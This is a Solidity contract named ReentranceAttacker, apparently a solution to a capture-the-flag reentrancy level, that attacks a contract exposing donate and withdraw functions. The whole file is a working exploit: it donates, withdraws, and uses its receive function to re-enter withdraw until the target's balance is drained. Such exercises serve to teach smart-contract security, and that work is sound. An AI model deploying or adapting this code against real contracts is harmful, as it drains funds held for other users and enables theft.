// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract ReentranceAttacker {
    Reentrance public reentrance;

    constructor(address _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balance = address(reentrance).balance;
        if (balance > 0) {
            if (msg.value < balance) {
                reentrance.withdraw(msg.value);
            } else {
                reentrance.withdraw(balance);
            }
        }
    }
}

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}
